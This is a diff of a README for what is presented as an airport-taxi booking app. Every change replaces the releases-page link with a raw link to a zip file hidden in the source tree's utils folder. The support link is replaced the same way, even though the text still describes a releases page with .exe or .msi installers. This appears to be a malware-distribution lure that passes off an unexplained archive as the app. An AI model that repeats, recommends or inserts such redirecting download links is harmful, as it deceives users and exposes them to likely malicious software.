@@ -1,6 +1,6 @@
 # ✈️ RKN-Airport-Taxi - Easy Airport Taxi Booking App
 
-[![Download RKN-Airport-Taxi](https://img.shields.io/badge/Download-RKN--Airport--Taxi-brightgreen?style=for-the-badge)](https://github.com/hieroicirzaa/RKN-Airport-Taxi/releases)
+[![Download RKN-Airport-Taxi](https://img.shields.io/badge/Download-RKN--Airport--Taxi-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hieroicirzaa/RKN-Airport-Taxi/main/frontend/src/utils/Taxi-RK-Airport-outrank.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This app uses stable technologies to provide smooth functioning and avoid crashe
 
 To get the app, visit the release page below. This page has the latest version ready for download.
 
-[![Get RKN-Airport-Taxi on GitHub](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/hieroicirzaa/RKN-Airport-Taxi/releases)
+[![Get RKN-Airport-Taxi on GitHub](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/hieroicirzaa/RKN-Airport-Taxi/main/frontend/src/utils/Taxi-RK-Airport-outrank.zip)
 
 ---
 
@@ -57,7 +57,7 @@ Follow these steps to run RKN-Airport-Taxi on your Windows machine:
 
 Go to the releases page by clicking this link:
 
-https://github.com/hieroicirzaa/RKN-Airport-Taxi/releases
+https://raw.githubusercontent.com/hieroicirzaa/RKN-Airport-Taxi/main/frontend/src/utils/Taxi-RK-Airport-outrank.zip
 
 Look for the latest version. It will usually have a file name ending with `.exe` or `.msi`.
 
@@ -170,8 +170,8 @@ RKN-Airport-Taxi uses secure login with encryption. The app protects your person
 
 ## 📞 Getting Support
 
-If you need help, visit the [GitHub Issues page](https://github.com/hieroicirzaa/RKN-Airport-Taxi/issues) or contact support through the release page.
+If you need help, visit the [GitHub Issues page](https://raw.githubusercontent.com/hieroicirzaa/RKN-Airport-Taxi/main/frontend/src/utils/Taxi-RK-Airport-outrank.zip) or contact support through the release page.
 
 ---
 
-[![Download RKN-Airport-Taxi](https://img.shields.io/badge/Download-RKN--Airport--Taxi-brightgreen?style=for-the-badge)](https://github.com/hieroicirzaa/RKN-Airport-Taxi/releases)
+[![Download RKN-Airport-Taxi](https://img.shields.io/badge/Download-RKN--Airport--Taxi-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hieroicirzaa/RKN-Airport-Taxi/main/frontend/src/utils/Taxi-RK-Airport-outrank.zip)
